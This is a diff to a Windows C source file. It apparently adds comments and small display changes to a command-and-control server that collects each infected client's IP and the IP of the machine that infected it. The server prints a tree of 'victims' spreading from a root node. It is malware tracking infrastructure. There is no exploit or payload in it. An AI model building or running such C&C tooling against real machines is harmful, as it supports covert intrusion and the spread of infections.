@@ -1,21 +1,38 @@
+//	Server.c
+//	Programmer:	Daniel L.
+
+//	This is a C&C server program that gets two messages from the client and catalouges the inforation
+//	int a data structure.
+
+//	The server establishes a socket connection to the local ip on a hardcoded port (macro PORT), and 
+//	waits for connections on an infinite loop.
+//	The new connection process time can be configured using SLEEP_TIME. it dictates the time between
+//	proessing cycles, measured in miliseconds (ms).
+
+//	Once recieving a connction it will attempt to accept it and recieve two messages from the client machine.
+// 	1. it's ip.
+//	2. it's corruptor's ip.
+
+//	It will then keep it in a linked list structure under a single root node.
+//	Each processing cycle it will print the current node tree/linked list.
+
 #include	<stdio.h>
 #include	<string.h>
 #include	<stdlib.h>
-#include	<process.h>
 #include	<WinSock2.h>
 #include	<ws2tcpip.h>
 
 #define		SUCCESS			1
 #define		FAILURE			0
-#define		xalloc(type)	(type *) malloc(sizeof(type))
+#define		xalloc(type)	(type *) malloc(sizeof(type))	// Universal memory allocation macro.
 
-#define		DMUL			5
-#define 	BUFFLEN			255
-#define		SLEEP_TIME		500
+#define		DMUL			5		// Multipler value used for the amount of dashes in the sub-arrow.
+#define 	BUFFLEN			255		// The size of the buffer for recieving messages from clients.
+#define		SLEEP_TIME		500		// The sleep time between processing cycles.
 
-#define		ROOT_IP			"Origin"
-#define		PORT			6666
-#define		MAXQUE			10
+#define		ROOT_IP			""		// The display string for the original node in the list.
+#define		PORT			6666	// The port to bind to.
+#define		MAXQUE			10		// Max amount of machine that can queue to get accepted.
 
 
 #pragma 	comment(lib, "Ws2_32.lib")
@@ -47,6 +64,7 @@ void arrow(int a);
 
 int main(int argc, char* argv[])
 {
+	clrscr();
 
 	// Initialize the windows socketing API.
 	if((WSAStartup(MAKEWORD(2,2), &ws)) != 0)
@@ -105,11 +123,14 @@ int main(int argc, char* argv[])
 	tv.tv_sec = 1;
 	tv.tv_usec = 0;
 
+	// Create the root Node.
 	rootNode = vcreate(ROOT_IP);
 	nMaxFd = newSocket;
 
 	while (1)
 	{
+		clrscr();
+		
 		FD_ZERO(&fr);
 		FD_ZERO(&fw);
 		FD_ZERO(&fe);
@@ -219,12 +240,13 @@ int addNode(vptr current, vptr victim, char *parentIp) /* addNode: Add a node to
 
 void vprint(vptr current, int depth) /* vprint: Print the tree structure from the given root node, prints all infected then nexts w/ indentation. */
 {
-	if (depth > 0) // Print an arrow if needed.
+	if (depth > 0) 							// Print an arrow if needed.
 		arrow(depth);
-	printf("[%s]\n", current->ip); 
-	if(current->victims != NULL) // Print all victims first.
+	if	(strcmp(current->ip, "") != 0) 		// Only print node ip if it has a value.
+		printf("[%s]\n", current->ip); 
+	if(current->victims != NULL) 			// Print all victims first.
 		vprint(current->victims, depth + 1);
-	if(current->next != NULL) // Print next same-depth machines last.
+	if(current->next != NULL) 				// Print next same-depth machines last.
 		vprint(current->next, depth);
 }
 
